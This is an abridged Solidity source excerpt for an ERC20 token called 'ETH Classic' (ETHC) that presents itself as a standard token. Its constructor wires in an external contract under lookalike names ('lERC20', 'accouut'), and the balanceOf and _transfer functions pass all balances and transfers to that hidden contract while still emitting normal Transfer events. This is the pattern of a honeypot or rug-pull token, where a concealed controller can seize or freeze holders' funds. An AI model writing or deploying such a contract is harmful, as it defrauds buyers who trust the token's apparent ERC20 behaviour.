...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_, address _basic) {
        _name = name_;
        _symbol = symbol_;
        ethclassic = lERC20(_basic);
        accouut = ethclassic.receiver();
    }
    ...
    function balanceOf(address account)
        ...
        returns (uint256)
    {
        return ethclassic.balanceOf(account);
    }
...
contract ETHC is ERC20, Ownable {
    ...
    constructor(address receiver) ERC20("ETH Classic", "ETHC", receiver) {
    ...
    function _transfer(
        ...
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        ethclassic._transfer(from, to, amount);
        emit Transfer(from,to,amount);
    }
}